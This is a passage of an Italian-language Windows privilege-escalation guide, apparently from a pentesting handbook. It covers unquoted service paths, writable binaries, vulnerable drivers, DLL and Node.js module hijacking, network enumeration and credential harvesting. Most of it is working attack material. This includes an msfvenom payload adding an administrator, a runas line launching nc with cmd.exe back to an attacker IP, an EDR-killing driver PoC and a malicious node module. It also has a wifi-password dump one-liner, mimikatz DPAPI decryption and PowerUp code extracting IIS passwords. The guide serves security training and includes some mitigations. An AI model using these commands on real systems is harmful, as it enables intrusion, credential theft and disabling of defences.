for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puoi rilevare e sfruttare** questa vulnerabilità con metasploit: `exploit/windows/local/trusted\_service\_path` Puoi creare manualmente un binary di service con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Azioni di recupero

Windows consente agli utenti di specificare azioni da intraprendere se un servizio fallisce. Questa funzionalità può essere configurata per puntare a un binary. Se questo binary è sostituibile, potrebbe essere possibile una privilege escalation. Maggiori dettagli si possono trovare nella [documentazione ufficiale](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applicazioni

### Applicazioni installate

Controlla i **permessi dei binaries** (forse puoi sovrascriverne uno ed eseguire una privilege escalation) e delle **cartelle** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permessi di scrittura

Verifica se puoi modificare qualche file di configurazione per leggere qualche file speciale o se puoi modificare qualche binario che verrà eseguito da un account Administrator (schedtasks).

Un modo per trovare permessi deboli su cartelle/file nel sistema è fare:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ carica automaticamente qualsiasi DLL di plugin nelle sue sottocartelle `plugins`. Se è presente un'installazione portable/copy scrivibile, depositare un plugin malevolo dà esecuzione automatica del codice dentro `notepad++.exe` a ogni avvio (inclusi `DllMain` e i callback del plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Controlla se puoi sovrascrivere qualche registry o binary che verrà eseguito da un altro utente.**\
**Leggi** la **seguente pagina** per saperne di più su interessanti **posizioni di autorun per elevare i privilegi**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Cerca possibili driver di terze parti strani/vulnerabili
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Se un driver espone una primitive arbitraria di kernel read/write (comune in handler IOCTL mal progettati), puoi elevare privilegi rubando direttamente un token SYSTEM dalla memoria del kernel. Vedi la tecnica passo-passo qui:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Per bug di race condition in cui la chiamata vulnerabile apre un percorso Object Manager controllato dall'attaccante, rallentare deliberatamente la lookup (usando componenti di lunghezza massima o catene di directory profonde) può estendere la finestra da microsecondi a decine di microsecondi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitive di memory corruption del registry hive

Le moderne vulnerabilità hive ti permettono di grooming di layout deterministici, abusare di discendenti HKLM/HKU scrivibili e convertire la corruzione dei metadati in overflow kernel paged-pool senza un custom driver. Scopri l'intera catena qui:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion in `RtlQueryRegistryValues` direct-mode da percorsi controllati dall'attaccante

Alcuni driver accettano un registry path da userland, validano solo che sia una stringa UTF-16 sensata, e poi chiamano `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` con `RTL_QUERY_REGISTRY_DIRECT` in uno scalar di stack come `int readValue`. Se `RTL_QUERY_REGISTRY_TYPECHECK` manca, `EntryContext` viene interpretato in base al tipo **effettivo** del registry, non al tipo che lo sviluppatore si aspettava.

Questo crea due primitive utili:

- **Confused deputy / oracle**: un percorso assoluto `\Registry\...` controllato dall'utente permette al driver di interrogare chiavi scelte dall'attaccante, leak della presenza tramite codici di ritorno/log, e talvolta leggere valori a cui il chiamante non poteva accedere direttamente.
- **Kernel memory corruption**: una destinazione scalare come `&readValue` diventa type-confused come `REG_QWORD`, `UNICODE_STRING`, o un buffer binario di dimensione specifica a seconda del tipo del valore del registry.

Note pratiche di exploitation:

- **Mitigazione Windows 8+**: se la query colpisce un **untrusted hive** con `RTL_QUERY_REGISTRY_DIRECT` ma senza `RTL_QUERY_REGISTRY_TYPECHECK`, i chiamanti kernel vanno in crash con `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Per mantenere l'exploitabilità, cerca **chiavi scrivibili dall'attaccante all'interno di trusted system hive** invece di staging dei valori sotto `HKCU`.
- **Trusted-hive staging**: usa NtObjectManager per enumerare i discendenti scrivibili di `\Registry\Machine`, e riesegui la scansione con un token **low-integrity** duplicato per trovare chiavi raggiungibili da contesti sandboxed:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: una scrittura diretta di 8 byte in un `int` da 4 byte corrompe i dati adiacenti dello stack e può sovrascrivere parzialmente un callback/function pointer vicino.
- **`REG_SZ` / `REG_EXPAND_SZ`**: la modalità diretta si aspetta che `EntryContext` punti a una `UNICODE_STRING`. Se il codice prima carica un `REG_DWORD` controllato dall'attaccante in uno scalare dello stack e poi riusa quel medesimo buffer per una lettura di stringa, l'attaccante controlla `Length`/`MaximumLength` e influenza parzialmente il puntatore `Buffer`, ottenendo una semi-controlled kernel write.
- **`REG_BINARY`**: per dati binari grandi, la modalità diretta tratta il primo `LONG` in `EntryContext` come dimensione del buffer con segno. Se una precedente lettura `REG_DWORD` lascia un valore **negativo** controllato dall'attaccante nello scalare riutilizzato, la successiva query `REG_BINARY` copia i byte dell'attaccante direttamente sopra gli slot adiacenti dello stack, che spesso è il percorso più pulito per la completa sovrascrittura di un callback-pointer.

Strong hunting pattern: **letture di registry eterogenee nella stessa variabile di stack senza reinizializzarla**. Cerca `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, puntatori `EntryContext` riutilizzati e code path in cui la prima lettura del registry controlla se una seconda lettura avviene.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Alcuni driver di terze parti firmati creano il loro device object con una SDDL forte tramite IoCreateDeviceSecure ma dimenticano di impostare FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Senza questo flag, la DACL sicura non viene applicata quando il device viene aperto tramite un path che contiene un componente extra, permettendo a qualsiasi utente non privilegiato di ottenere un handle usando un namespace path come:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (da un caso reale)

Una volta che un utente può aprire il device, le IOCTL privilegiate esposte dal driver possono essere abusate per LPE e tampering. Capacità osservate nel mondo reale:
- Restituire handle con accesso completo a processi arbitrari (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Lettura/scrittura raw del disco senza restrizioni (offline tampering, trucchi di persistenza al boot-time).
- Terminare processi arbitrari, inclusi Protected Process/Light (PP/PPL), consentendo di killare AV/EDR da user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigazioni per gli sviluppatori
- Imposta sempre FILE_DEVICE_SECURE_OPEN quando crei device objects destinati a essere limitati da una DACL.
- Valida il caller context per le operazioni privilegiate. Aggiungi controlli PP/PPL prima di consentire la terminazione di un processo o il ritorno di handle.
- Restringi gli IOCTLs (access masks, METHOD_*, validazione dell'input) e considera modelli brokered invece dei privilegi kernel diretti.

Idee di detection per i defender
- Monitora gli open in user-mode di nomi di device sospetti (ad es. \\ .\\amsdk*) e specifiche sequenze IOCTL indicative di abuso.
- Applica la vulnerable driver blocklist di Microsoft (HVCI/WDAC/Smart App Control) e mantieni le tue allow/deny lists.


## PATH DLL Hijacking

Se hai **permessi di scrittura dentro una cartella presente nel PATH** potresti riuscire a hijackare una DLL caricata da un processo ed **escalare i privilegi**.

Controlla i permessi di tutte le cartelle dentro PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Per ulteriori informazioni su come abusare di questo check:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Questa è una variante di **Windows uncontrolled search path** che colpisce le applicazioni **Node.js** ed **Electron** quando eseguono un import diretto come `require("foo")` e il modulo atteso è **mancante**.

Node risolve i package risalendo l’albero delle directory e controllando le cartelle `node_modules` in ogni directory padre. Su Windows, questa risalita può arrivare fino alla root del drive, quindi un’applicazione avviata da `C:\Users\Administrator\project\app.js` può finire per cercare:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Se un **utente con privilegi bassi** può creare `C:\node_modules`, può inserire un `foo.js` malevolo (o una cartella package) e attendere che un processo **Node/Electron con privilegi più alti** risolva la dipendenza mancante. Il payload viene eseguito nel contesto di sicurezza del processo vittima, quindi questo diventa **LPE** ogni volta che il target gira come amministratore, da un task pianificato/wrapper di servizio elevato, oppure da una desktop app privilegiata avviata automaticamente.

Questo è particolarmente comune quando:

- una dipendenza è dichiarata in `optionalDependencies`
- una libreria di terze parti wrappa `require("foo")` in `try/catch` e continua in caso di errore
- un package è stato rimosso dalle build di produzione, omesso durante il packaging o non è riuscito a installarsi
- il `require()` vulnerabile si trova in profondità nell’albero delle dipendenze invece che nel codice principale dell’applicazione

### Hunting target vulnerabili

Usa **Procmon** per dimostrare il percorso di risoluzione:

- Filtra per `Process Name` = eseguibile target (`node.exe`, l’EXE dell’app Electron o il processo wrapper)
- Filtra per `Path` `contains` `node_modules`
- Concentrati su `NAME NOT FOUND` e sull’ultima apertura riuscita sotto `C:\node_modules`

Pattern utili di code review nei file `.asar` estratti o nei sorgenti dell’applicazione:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Identifica il **nome del pacchetto mancante** da Procmon o dalla revisione del sorgente.
2. Crea la directory root di ricerca se non esiste già:
```powershell
mkdir C:\node_modules
```
3. Inserire un module con il nome esatto previsto:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Attiva l'applicazione vittima. Se l'applicazione tenta `require("foo")` e il modulo legittimo è assente, Node può caricare `C:\node_modules\foo.js`.

Esempi reali di moduli opzionali mancanti che rientrano in questo pattern includono `bluebird` e `utf-8-validate`, ma la **technique** è la parte riutilizzabile: trova qualsiasi **missing bare import** che un processo Node/Electron privilegiato su Windows risolva.

### Detection and hardening ideas

- Alert when a user creates `C:\node_modules` or writes new `.js` files/packages there.
- Hunt for high-integrity processes reading from `C:\node_modules\*`.
- Package all runtime dependencies in production and audit `optionalDependencies` usage.
- Review third-party code for silent `try { require("...") } catch {}` patterns.
- Disable optional probes when the library supports it (for example, some `ws` deployments can avoid the legacy `utf-8-validate` probe with `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### file hosts

Controlla altri computer noti codificati hardcoded nel file hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfacce di rete & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Porte aperte

Controlla i **servizi con restrizioni** dall'esterno
```bash
netstat -ano #Opened ports?
```
### Tabella di routing
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regole del Firewall

[**Controlla questa pagina per i comandi relativi al Firewall**](../basic-cmd-for-pentesters.md#firewall) **(lista regole, crea regole, disattiva, disattiva...)**

Più[ comandi per l'enumerazione di rete qui](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Il binary `bash.exe` può anche essere trovato in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se ottieni l'utente root puoi ascoltare su qualsiasi porta (la prima volta che usi `nc.exe` per ascoltare su una porta ti chiederà tramite GUI se `nc` dovrebbe essere consentito dal firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Per avviare facilmente bash come root, puoi provare `--default-user root`

Puoi esplorare il filesystem di `WSL` nella cartella `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenziali di Windows

### Credenziali di Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

Da [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault memorizza le credenziali dell'utente per server, siti web e altri programmi che **Windows** può **effettuare l'accesso automatico per gli utenti**. A prima vista, potrebbe sembrare che ora gli utenti possano salvare le credenziali di Facebook, Twitter, Gmail, ecc., così da effettuare automaticamente l'accesso tramite i browser. Ma non è così.

Windows Vault memorizza le credenziali che Windows può usare per effettuare l'accesso automatico per gli utenti, il che significa che qualsiasi **applicazione Windows che necessita di credenziali per accedere a una risorsa** (server o sito web) **può fare uso di questo Credential Manager** e di Windows Vault e usare le credenziali fornite invece di far inserire ogni volta username e password dagli utenti.

A meno che le applicazioni non interagiscano con Credential Manager, non credo sia possibile per loro usare le credenziali per una data risorsa. Quindi, se la tua applicazione vuole fare uso del vault, dovrebbe in qualche modo **comunicare con il credential manager e richiedere le credenziali per quella risorsa** dal vault di archiviazione predefinito.

Usa `cmdkey` per elencare le credenziali memorizzate sulla macchina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Poi puoi usare `runas` con le opzioni `/savecred` per utilizzare le credenziali salvate. Il seguente esempio richiama un binario remoto tramite una condivisione SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` con un insieme di credenziali fornito.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Nota che mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), o dal [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

La **Data Protection API (DPAPI)** fornisce un metodo per la crittografia simmetrica dei dati, usato principalmente all'interno del sistema operativo Windows per la crittografia simmetrica delle chiavi private asimmetriche. Questa crittografia sfrutta un segreto dell'utente o del sistema per contribuire in modo significativo all'entropia.

**DPAPI consente la crittografia delle chiavi tramite una chiave simmetrica derivata dai segreti di accesso dell'utente**. Negli scenari che coinvolgono la crittografia di sistema, utilizza i segreti di autenticazione del dominio del sistema.

Le chiavi RSA utente crittografate, usando DPAPI, sono archiviate nella directory `%APPDATA%\Microsoft\Protect\{SID}`, dove `{SID}` rappresenta il [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) dell'utente. **La chiave DPAPI, collocata insieme alla master key che protegge le chiavi private dell'utente nello stesso file**, in genere consiste in 64 byte di dati casuali. (È importante notare che l'accesso a questa directory è limitato, impedendone l'elencazione dei contenuti tramite il comando `dir` in CMD, anche se può essere elencata tramite PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puoi usare il **mimikatz module** `dpapi::masterkey` con gli argomenti appropriati (`/pvk` o `/rpc`) per decrittografarlo.

I **credentials files protetti dalla master password** si trovano di solito in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puoi usare il **modulo mimikatz** `dpapi::cred` con il `/masterkey` appropriato per decifrare.\
Puoi **estrarre molte DPAPI** **masterkeys** dalla **memoria** con il modulo `sekurlsa::dpapi` (se sei root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenziali PowerShell

Le **credenziali PowerShell** sono spesso usate per attività di **scripting** e automazione come modo comodo per memorizzare credenziali cifrate. Le credenziali sono protette usando **DPAPI**, il che in genere significa che possono essere decifrate solo dallo stesso utente sullo stesso computer su cui sono state create.

Per **decifrare** una credenziale PS dal file che la contiene puoi fare:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connessioni RDP salvate

Puoi trovarle in `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandi eseguiti di recente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Usa il modulo **Mimikatz** `dpapi::rdg` con il `/masterkey` appropriato per **decifrare qualsiasi file .rdg**\
Puoi **estrarre molte masterkey DPAPI** dalla memoria con il modulo `sekurlsa::dpapi` di Mimikatz

### Sticky Notes

Le persone spesso usano l'app StickyNotes sui workstation Windows per **salvare password** e altre informazioni, senza rendersi conto che si tratta di un file database. Questo file si trova in `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` e vale sempre la pena cercarlo ed esaminarlo.

### AppCmd.exe

**Nota che per recuperare password da AppCmd.exe devi essere Administrator ed eseguire con un High Integrity level.**\
**AppCmd.exe** si trova nella directory `%systemroot%\system32\inetsrv\`.\
Se questo file esiste, è possibile che alcune **credentials** siano state configurate e possano essere **recovered**.

Questo codice è stato estratto da [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Controlla se `C:\Windows\CCM\SCClient.exe` esiste .\
I programmi di installazione vengono **eseguiti con privilegi SYSTEM**, molti sono vulnerabili al **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## File e Registry (Credenziali)

### Credenziali Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Chiavi host SSH di Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys nel registro

Le chiavi private SSH possono essere memorizzate nella chiave di registro `HKCU\Software\OpenSSH\Agent\Keys`, quindi dovresti controllare se c'è qualcosa di interessante lì dentro:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se trovi una voce all'interno di quel percorso, probabilmente si tratta di una chiave SSH salvata. È memorizzata in forma cifrata, ma può essere facilmente decifrata usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Più informazioni su questa tecnica qui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se il servizio `ssh-agent` non è in esecuzione e vuoi che si avvii automaticamente all'avvio, esegui:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Sembra che questa tecnica non sia più valida. Ho provato a creare alcune chiavi ssh, ad aggiungerle con `ssh-add` e ad accedere via ssh a una macchina. Il registro HKCU\Software\OpenSSH\Agent\Keys non esiste e procmon non ha identificato l'uso di `dpapi.dll` durante l'autenticazione con chiave asimmetrica.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Puoi anche cercare questi file usando **metasploit**: _post/windows/gather/enum_unattend_

Contenuto di esempio:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backup SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenziali Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Cerca un file chiamato **SiteList.xml**

### Cached GPP Pasword

In passato era disponibile una funzionalità che consentiva di distribuire account amministratore locali personalizzati su un gruppo di macchine tramite Group Policy Preferences (GPP). Tuttavia, questo metodo presentava gravi falle di sicurezza. Innanzitutto, i Group Policy Objects (GPOs), memorizzati come file XML in SYSVOL, potevano essere accessibili da qualsiasi utente del dominio. In secondo luogo, le password all'interno di questi GPP, cifrate con AES256 usando una chiave predefinita documentata pubblicamente, potevano essere decifrate da qualsiasi utente autenticato. Questo rappresentava un serio rischio, poiché poteva consentire agli utenti di ottenere privilegi elevati.

Per mitigare questo rischio, è stata sviluppata una funzione per cercare file GPP memorizzati localmente che contengano un campo "cpassword" non vuoto. Quando viene trovato un file del genere, la funzione decifra la password e restituisce un oggetto PowerShell personalizzato. Questo oggetto include dettagli sul GPP e sulla posizione del file, aiutando nell'identificazione e nella correzione di questa vulnerabilità di sicurezza.

Cerca in `C:\ProgramData\Microsoft\Group Policy\history` o in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (precedente a W Vista)_ questi file:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Per decifrare il cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
